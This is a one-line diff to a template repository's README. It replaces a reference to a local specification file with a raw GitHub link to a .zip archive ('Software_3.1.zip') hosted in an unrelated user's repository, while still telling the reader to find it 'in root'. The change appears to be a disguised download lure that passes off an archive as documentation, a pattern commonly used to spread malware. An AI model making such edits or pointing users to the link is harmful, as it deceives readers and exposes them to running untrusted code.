@@ -1,4 +1,4 @@
-= RSR template repo - see RSR_OUTLINE.adoc in root for general background and specification
+= RSR template repo - see https://raw.githubusercontent.com/Lrkbossyt/contractiles/main/.machine_readable/6scm/Software_3.1.zip in root for general background and specification
 
 == This is your repo - don't forget to rename me!
 
